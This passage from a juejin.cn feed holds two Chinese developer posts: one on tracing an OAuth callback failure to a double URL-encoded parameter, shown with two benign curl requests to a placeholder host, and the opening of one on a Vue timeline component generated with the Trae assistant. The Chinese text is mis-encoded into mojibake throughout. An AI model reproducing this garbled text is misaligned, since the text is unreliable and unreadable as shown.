</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[URLè§£ç è¸©å‘è®°å½•]]></title>    <link>https://juejin.cn/post/7575897635137503232</link>    <guid>https://juejin.cn/post/7575897635137503232</guid>    <pubDate>2025-11-24T10:26:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575897635137503232" data-draft-id="7576086446459781155" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="URLè§£ç è¸©å‘è®°å½•"/> <meta itemprop="keywords" content="åç«¯,å‰ç«¯"/> <meta itemprop="datePublished" content="2025-11-24T10:26:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Oriental"/> <meta itemprop="url" content="https://juejin.cn/user/2711816846968536"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            URLè§£ç è¸©å‘è®°å½•
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2711816846968536/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Oriental
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T10:26:25.000Z" title="Mon Nov 24 2025 10:26:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><strong>å¼•è¨€</strong></p>
</blockquote>
<p>æœ€è¿‘æœ‰åœ¨å¯¹æ¥OAuthç›¸å…³çš„å·¥ä½œï¼Œä»Šå¤©æ–°å†™äº†ä¸€ä¸ªæ¥å£ç”¨äºè¯·æ±‚å›è°ƒåœ°å€ï¼Œä½†ä¸€ç›´æ˜¾ç¤ºæœ‰é—®é¢˜ï¼Œäºæ˜¯å°±æœ‰äº†ä»Šå¤©è¿™ç¯‡æ–‡ç« </p>
<h5 data-id="heading-0">é—®é¢˜èµ·å› </h5>
<p>åœ¨è®¿é—®åç«¯æ¥å£æ—¶ï¼Œå‘ç°è¿”å›çš„ä¸€ç›´æ˜¯ <code>500</code>ï¼Œè¿”å›çš„dataæ•°æ®ä¸º <code>null</code>ï¼Œæ— æ³•æ­£å¸¸è¿”å› <code>LinkUrl(è·³è½¬åœ°å€)</code></p>
<h5 data-id="heading-1">è§£å†³æ€è·¯</h5>
<p><strong>æ¥å£éªŒè¯</strong>
é¦–å…ˆæ‹¿ä¸Šæ¥å£çš„è°ƒç”¨å‚æ•°è¿›è¡Œæ¥å£çš„è¯·æ±‚éªŒè¯ï¼Œæˆ‘çš„æ¥å£æä¾›ï¼ˆé‡ç‚¹å°±åœ¨è¿™ï¼‰</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">type:</span> <span class="hljs-keyword">GET</span>
<span class="hljs-symbol">param:</span> authUrl
<span class="hljs-symbol">return:</span> 
{
	code: int,
	data: <span class="hljs-type">string</span>,
	msg: <span class="hljs-type">string</span>
}
</code></pre>
<p>äºæ˜¯æˆ‘å¼€å§‹äº†æ¼«é•¿çš„ <code>url</code>æ¯”å¯¹ï¼Œå‘ç° <code>url</code>ç¡®å®å­˜åœ¨å‡ºå…¥ï¼Œäºæ˜¯å‘Šè¯‰å‰ç«¯åŒå­¦å¯¹ <code>url</code>è¿›è¡Œå˜æ›´ï¼Œä½†ä¾æ—§æ˜¯æ²¡æœ‰è§£å†³é—®é¢˜</p>
<p><strong>æœ¬åœ°æµ‹è¯•</strong>
æˆ‘å¼€å§‹æ‹¿ç€å‚æ•°å¯¹æœ¬åœ°çš„æ¥å£å¼€å¯æµ‹è¯•ï¼Œä½¿ç”¨ <code>ApiFox</code>è¿›è¡Œæµ‹è¯•ï¼Œå‘ç°å¯ä»¥æ­£å¸¸è°ƒç”¨ï¼Œä¸”è¿”å›äº†å¯¹åº”çš„ <code>LinkUrl</code>ï¼Œæˆ‘çš„ä»£ç é€»è¾‘æ˜¯è·å–åˆ°å‰ç«¯æä¾›çš„ <code>authUrl</code>ç„¶åå»è¯·æ±‚ç¬¬ä¸‰æ–¹çš„å¹³å°è·å–åˆ° <code>LinkUrl</code>ï¼Œäºæ˜¯æˆ‘åˆæ¯”å¯¹äº†æˆ‘æœ¬åœ°å’Œ <code>dev</code>ç¯å¢ƒçš„ä»£ç å·®å¼‚ï¼Œå‘ç°ä»£ç ä¾æ—§æ˜¯ä¸€è‡´ï¼Œå‰ç«¯åŒå­¦æ˜¯ç›´æ¥è°ƒç”¨çš„ <code>dev</code>çš„åç«¯ä»£ç ï¼Œäºæ˜¯æˆ‘æƒ³æ˜¯ä¸æ˜¯å¯¹æˆ‘ä»¬è®¾ç½®çš„å›è°ƒåœ°å€åšäº†é™åˆ¶ï¼Œå› ä¸ºæˆ‘ä»¬ä¹‹å‰æ˜¯åšäº†å¤‡æ¡ˆçš„ï¼Œäºæ˜¯å°†å‰ç«¯åŒå­¦ä»£ç å‘å¸ƒè‡³ <code>dev</code>ç¯å¢ƒåæµ‹è¯•å‘ç°ä¾æ—§è¡Œä¸é€š</p>
<p><strong>æ—¥å¿—è§‚å¯Ÿ</strong>
è¿™ä¸ªæ—¶å€™åªèƒ½å»çœ‹ä¸€ä¸‹æ—¥å¿—çš„æƒ…å†µæ˜¯ä»€ä¹ˆæ ·å­ï¼Œå› ä¸ºæˆ‘æœ¬åœ°æ ¹æœ¬å¤ç°ä¸å‡ºè°ƒç”¨å¼‚å¸¸æƒ…å†µï¼Œå‘ç°æ—¥å¿—ä¸­æœ‰è¿™ä¹ˆä¸€æ®µ</p>
<pre><code class="hljs language-vbscript" lang="vbscript"><span class="hljs-number">400</span> Bad <span class="hljs-built_in">Request</span> <span class="hljs-keyword">on</span> <span class="hljs-keyword">GET</span> <span class="hljs-built_in">request</span> <span class="hljs-keyword">for</span> XXXX(åœ°å€)
redirectURI must be a URL address
</code></pre>
<p>ç›´åˆ°ç°åœ¨æˆ‘ä¾æ—§è®¤ä¸ºæˆ‘çš„åœ°å€å‡ºç°äº†é—®é¢˜ï¼Œæ‰€ä»¥å¾ˆé•¿æ—¶é—´é™·å…¥å¯¹é‡å®šå‘çš„åœ°å€çš„é—®é¢˜æ’æŸ¥</p>
<p><strong>åœ°å€æ¯”å¯¹</strong>
å¾ˆé•¿æ—¶é—´æ²¡æœ‰ç»“æœåï¼Œæˆ‘ä¾æ—§æƒ³ç€å¯ä¸å¯ä»¥åœ¨æœ¬åœ°å»å¤ç°è¿™ä¸ªé—®é¢˜ï¼Œäºæ˜¯æˆ‘æ‹¿ç€ <code>dev</code>ç¯å¢ƒçš„è¯·æ±‚å‚æ•°å»è¯·æ±‚æˆ‘æœ¬åœ°ï¼Œç»ˆäºè®©æˆ‘å¤ç°å‡ºæ¥äº†ï¼Œ æ¥ä¸‹æ¥å°±æ˜¯åˆ†ææˆ‘è¯·æ±‚æˆåŠŸå’Œä¸æˆåŠŸçš„ä¼ å‚ã€‚</p>
<p>åˆšå¼€å§‹ä¾æ—§è®¤ä¸ºä¼ å‚æ˜¯ä¸€è‡´ï¼Œè¿˜ä¸åœçš„å»æ‰¾åœ°å€ä¸­æ˜¯ä¸æ˜¯æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œåæ¥ç»ˆäºè®©æˆ‘å‘ç°äº†é—®é¢˜ï¼Œä¸¤ä¸ªä¸åŒçš„ <code>url</code>åœ°å€ä¸‹</p>
<pre><code class="hljs language-bash" lang="bash">(å¯ä»¥æ­£å¸¸è¯·æ±‚)
curl <span class="hljs-string">'https://my.test.com/auth?authUrl=https//authentication.com?redirectURI=https%3a%2f%2fmy.test.com%2fcallback&amp;source=PC_Browser&amp;lang=zh-HK&amp;brokerpage=xxxx'</span>

(ä¸å¯ä»¥æ­£å¸¸è¯·æ±‚)
curl <span class="hljs-string">'https://my.test.com/auth?authUrl=https%2f%2fauthentication.com%3fredirectURI%3dhttps%253a%252f%252fmy.test.com%252fcallback%26source%3dPC_Browser%26lang%3dzh-HK%26brokerpage%3dxxxx'</span>
</code></pre>
<p><strong>çœŸç›¸</strong>
ä¸‹é¢è¿™ä¸ªä¸å¯ä»¥æ­£å¸¸è¯·æ±‚çš„ <code>urlç¼–ç </code>äº†ä¸¤æ¬¡ï¼Œæ€»æ‰€å‘¨çŸ¥ <code>Tomcat</code>çš„ <code>Servlet</code>ä¼šå¯¹æ­£å¸¸çš„ <code>Http</code>è¿›è¡Œ <code>urlç¼–ç </code>ï¼Œä½†ä¸‹é¢çš„è¿™ä¸ªé”™è¯¯çš„ä¼ å‚ <code>urlç¼–ç </code>äº†ä¸¤æ¬¡ï¼Œæ‰€ä»¥å¯¼è‡´åç«¯åœ¨ä½¿ç”¨ <code>RestTemplate</code>è¿›è¡Œè¯·æ±‚çš„æ—¶å€™å‘ç”Ÿäº†ä¸Šè¿°æŠ¥é”™ï¼Œå¯¼è‡´æ²¡æœ‰åŠæ³•æ­£å¸¸è¯·æ±‚ã€‚</p>
<p>è‡³äºæˆ‘ä¸ºä»€ä¹ˆè¿™ä¹ˆç®€å•çš„é—®é¢˜æ²¡æœ‰å‘ç°ï¼Œæœ‰å„ç§å› ç´ ï¼ŒåŒ…æ‹¬å‰ç«¯ç»™æˆ‘çš„ <code>param</code>ä¹Ÿéƒ½æ˜¯è§£ç ä¹‹åçš„ï¼Œæ‰€ä»¥æˆ‘åˆšå¼€å§‹ä¸€ç›´æµ‹è¯•æ²¡æœ‰é—®é¢˜ï¼ŒçŸ¥é“åæ¥å¯¹æ¯”æ‰å‘ç°é—®é¢˜</p>
<blockquote>
<p>ç»“è¯­</p>
</blockquote>
<p>å…¶å®ä»£ç é—®é¢˜çš„æ’æŸ¥ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯ä¸€ä¸ªç»†å¿ƒæˆéƒ½ï¼Œå¦‚æœæˆ‘èƒ½æ—©ä¸€ç‚¹ç›´æ¥æ‹¿ç€æ§åˆ¶å°ä¸­ <code>netWork</code>è¿›è¡Œç›´æ¥å¯¹æ¯”ï¼Œä¸è¦ç›¸ä¿¡ä»»ä½•å¼€å‘äººå‘˜çš„ä¸€é¢ä¹‹è¯ã€‚è‡ªå·±ç»™è‡ªå·±ç®—æ˜¯ä¸‹çº¦å®šäº†ï¼Œä»¥åå†ä¹Ÿä¸ä¼šç”¨ <code>Get</code>æ–¹å¼è¿›è¡Œåœ°å€çš„ä¼ å‚ï¼Œç¡®å®æœ‰å¾ˆå¤šçš„å‘</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[120è¡Œä»£ç ï¼Œå®ç°ä¸æ»‘æ»šåŠ¨çš„æ—¶é—´è½´ç»„ä»¶]]></title>    <link>https://juejin.cn/post/7576108254603919403</link>    <guid>https://juejin.cn/post/7576108254603919403</guid>    <pubDate>2025-11-24T10:30:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576108254603919403" data-draft-id="7574382900860534811" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="120è¡Œä»£ç ï¼Œå®ç°ä¸æ»‘æ»šåŠ¨çš„æ—¶é—´è½´ç»„ä»¶"/> <meta itemprop="keywords" content="Trae"/> <meta itemprop="datePublished" content="2025-11-24T10:30:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä½ ä¸ä¼šå›°"/> <meta itemprop="url" content="https://juejin.cn/user/3664010809185870"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            120è¡Œä»£ç ï¼Œå®ç°ä¸æ»‘æ»šåŠ¨çš„æ—¶é—´è½´ç»„ä»¶
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3664010809185870/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä½ ä¸ä¼šå›°
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T10:30:23.000Z" title="Mon Nov 24 2025 10:30:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">å‰è¨€</h3>
<p>äº§å“åˆçœ‹è§ä¸€ä¸ªéå¸¸é«˜çº§çš„æ—¶é—´è½´é¡µé¢äº¤äº’ï¼ˆå¯¹äºå‰ç«¯æ¥è¯´ï¼Œå®ç°ä¸éš¾ï¼Œä¸»è¦æ˜¯èŠ±æ—¶é—´ï¼‰ï¼Œæˆ‘ä»¬å°è¯•ä¸€ä¸‹è®©Trae çš„soloæ¥å®ç°ï¼Œæœ€ç®€æ´çš„ä»£ç å®ç°ï¼Œå°½å¯èƒ½çš„æè¿°ä¸€ä¸‹ç»†èŠ‚ï¼Œè¿™æ ·æ‰å¯ä»¥æœ€å‡†ç¡®çš„å®ç°ï¼Œå°‘èµ°å¼¯è·¯ï¼Œä¸æµªè´¹æˆ‘ä»¬å®è´µçš„æ—¶é—´ï¼ˆæœ‰è¿™æ—¶é—´å¤šçœ‹å‡ ç¯‡æŠ€æœ¯æ–‡ç« ï¼Œä¸é¦™ï¼Ÿå•Šå“ˆå“ˆå“ˆï¼‰</p>
<p>é¦–å…ˆå…ˆæ­å»ºå¥½ä¸€ä¸ªé¡¹ç›®ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯vite+vue3+tsï¼Œç„¶åæ˜¯å¯¹åº”çš„å®‰è£…tailwind cssï¼Œè¿™äº›éƒ½æ˜¯è®©Trae soloæ¨¡å¼å¸®æˆ‘ä»¬æ­å»ºä¸€ä¸‹ï¼Œæˆ‘ä»¬å°±ä¸ç”¨ä»0æ­å»ºäº†</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ca500463503a40f9b58e50368ac65ee8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2g5LiN5Lya5Zuw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764585023&amp;x-signature=3vIINtvCM3wuZXyw3V1c12S5f5A%3D" alt="image-20251120152839739" loading="lazy"/></p>
<p>å…ˆæ¥çœ‹çœ‹æœ€ç»ˆçš„æ•ˆæœå®ç°ï¼Œä½ å¾ˆéš¾ç›¸ä¿¡è¿™æ˜¯ä¸€æ¬¡å¯¹è¯å°±å®ç°çš„</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/78cffe10028c4997a0eec286fa17e72d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2g5LiN5Lya5Zuw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764585023&amp;x-signature=8SzC7f0fRhmMf2MauAsJ1mmg6Lw%3D" alt="image.png" loading="lazy"/>
ä¸€.é¦–å…ˆæ˜¯æè¿°ç»†èŠ‚</p>
<p>1.æ—¶é—´è½´çš„ä¸­é—´æ˜¯å¯ä»¥æ»šåŠ¨çš„ï¼Œç„¶åè¦æ ¹æ®é¼ æ ‡è¿›è¡Œæ»šåŠ¨ï¼Œä¸è¦æ»šåŠ¨æ¡</p>
<p>2.å¥‡æ•°æ˜¯åœ¨ä¸Šé¢ï¼Œæ—¶é—´è½´çš„è¿æ¥çº¿æ¯”è¾ƒé•¿ï¼Œå¶æ•°æ˜¯åœ¨ä¸‹é¢ï¼Œè¿æ¥çº¿æ¯”è¾ƒçŸ­</p>
<p>3.ç®­å¤´åœ¨å³ä¸‹è§’å›ºå®šï¼Œä¿è¯ç”¨æˆ·çŸ¥é“è¿™ä¸ªæ˜¯æ—¶é—´è½´</p>
<p>4.å¡ç‰‡æœ€å¤§å®½åº¦æ˜¯240pxï¼Œè¶…å‡ºéšè—</p>
<p>5.çº¿å’Œå¡ç‰‡ä¸­é—´ä½¿ç”¨å€’ä¸‰è§’è¿æ¥èµ·æ¥</p>
<p>é™„åŠ ä¸Šä¸€å¼ uiè®¾è®¡çš„æˆªå›¾ï¼Œå°±å¯ä»¥å¼€å§‹æé—®äº†</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1ecda26416c641e296b8ca331961f328~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2g5LiN5Lya5Zuw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764585023&amp;x-signature=zXJVEYTDh9eWwH7hq9o0dOj5NYw%3D" alt="image.png" loading="lazy"/></p>
<p>ç­‰å¾…äº†ä¸€ä¼šï¼Œå°±å®ç°äº†</p>
<p>æ¥çœ‹çœ‹ä»£ç ï¼Œ119è¡Œå°±å®ç°äº†ï¼Œçœ‹èµ·æ¥ç¡®å®ä¼˜é›…ï¼Œè§£è¯»ä¸€ä¸‹ä»£ç trae soloæ˜¯å¦‚ä½•å®ç°è¿™ä¸ªç»„ä»¶çš„</p>
<p>1.å¡ç‰‡ï¼ˆå¥‡å¶é¡¹äº¤é”™ï¼Œä¸‹ç§»ä»¥è§†è§‰åŒºåˆ†ï¼‰,ä½¿ç”¨tailwindçš„<code>mt-[210px]</code>,</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>
 Â  Â  Â  Â  Â <span class="hljs-attr">class</span>=<span class="hljs-string">"relative max-w-[230px] overflow-hidden rounded-lg bg-[#1D2129] shadow-lg"</span>
 Â  Â  Â  Â   <span class="hljs-attr">:class</span>=<span class="hljs-string">"i % 2 !== 0 ? 'mt-[210px]' : ''"</span>
 Â  Â  Â  Â &gt;</span>
